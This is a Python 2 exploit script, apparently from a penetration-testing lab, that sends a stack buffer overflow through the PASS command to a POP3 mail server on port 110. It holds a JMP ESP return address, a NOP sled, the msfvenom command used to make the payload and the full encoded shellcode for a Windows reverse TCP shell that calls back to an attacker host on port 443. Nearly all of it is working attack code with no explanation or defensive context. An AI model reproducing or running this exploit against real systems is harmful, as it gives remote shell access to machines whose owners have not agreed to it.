#!/usr/bin/python
import socket

jmpESPlocation = "\x8f\x35\x4a\x5f"
#x86/shikata_ga_nai encoded windows\shell_reverse_tcp payload
#///  msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.135 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d" ///#
shellcode = ("\xb8\xc2\x30\xba\xaf\xda\xc0\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x52\x31\x42\x12\x03\x42\x12\x83\x28\xcc\x58\x5a\x50\xc5\x1f"
"\xa5\xa8\x16\x40\x2f\x4d\x27\x40\x4b\x06\x18\x70\x1f\x4a\x95"
"\xfb\x4d\x7e\x2e\x89\x59\x71\x87\x24\xbc\xbc\x18\x14\xfc\xdf"
"\x9a\x67\xd1\x3f\xa2\xa7\x24\x3e\xe3\xda\xc5\x12\xbc\x91\x78"
"\x82\xc9\xec\x40\x29\x81\xe1\xc0\xce\x52\x03\xe0\x41\xe8\x5a"
"\x22\x60\x3d\xd7\x6b\x7a\x22\xd2\x22\xf1\x90\xa8\xb4\xd3\xe8"
"\x51\x1a\x1a\xc5\xa3\x62\x5b\xe2\x5b\x11\x95\x10\xe1\x22\x62"
"\x6a\x3d\xa6\x70\xcc\xb6\x10\x5c\xec\x1b\xc6\x17\xe2\xd0\x8c"
"\x7f\xe7\xe7\x41\xf4\x13\x63\x64\xda\x95\x37\x43\xfe\xfe\xec"
"\xea\xa7\x5a\x42\x12\xb7\x04\x3b\xb6\xbc\xa9\x28\xcb\x9f\xa5"
"\x9d\xe6\x1f\x36\x8a\x71\x6c\x04\x15\x2a\xfa\x24\xde\xf4\xfd"
"\x4b\xf5\x41\x91\xb5\xf6\xb1\xb8\x71\xa2\xe1\xd2\x50\xcb\x69"
"\x22\x5c\x1e\x3d\x72\xf2\xf1\xfe\x22\xb2\xa1\x96\x28\x3d\x9d"
"\x87\x53\x97\xb6\x22\xae\x70\xb3\xb9\xb0\x07\xab\xbf\xb0\x06"
"\x97\x49\x56\x62\xf7\x1f\xc1\x1b\x6e\x3a\x99\xba\x6f\x90\xe4"
"\xfd\xe4\x17\x19\xb3\x0c\x5d\x09\x24\xfd\x28\x73\xe3\x02\x87"
"\x1b\x6f\x90\x4c\xdb\xe6\x89\xda\x8c\xaf\x7c\x13\x58\x42\x26"
"\x8d\x7e\x9f\xbe\xf6\x3a\x44\x03\xf8\xc3\x09\x3f\xde\xd3\xd7"
"\xc0\x5a\x87\x87\x96\x34\x71\x6e\x41\xf7\x2b\x38\x3e\x51\xbb"
"\xbd\x0c\x62\xbd\xc1\x58\x14\x21\x73\x35\x61\x5e\xbc\xd1\x65"
"\x27\xa0\x41\x89\xf2\x60\x71\xc0\x5e\xc0\x1a\x8d\x0b\x50\x47"
"\x2e\xe6\x97\x7e\xad\x02\x68\x85\xad\x67\x6d\xc1\x69\x94\x1f"
"\x5a\x1c\x9a\x8c\x5b\x35")
badchars = "\x00\x0a\x0d"				# kept for reference

# the magical evil goodness string :)
buffer = "A"*2606 + jmpESPlocation + "\x90"*8  + shellcode

data = ""

try:
  print "\nSending evil buffer..."
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)	# create our socket
  connect = s.connect(('10.11.14.139',110))		# connect to mailserver on 110
  data = s.recv(1024)					# get banner
  s.send('USER test\r\n')				# send username "test"
  data = s.recv(1024)					# get reply
  s.send('PASS ' + buffer + '\r\n')			# send 'buffer' pwd
  s.close()						# close socket
  print "\nDone. A Reverse shell should have come back..."
except:
  print "Couldn't connect to POP3...\n%s" % data
  print "buffer :: %s\n" % buffer

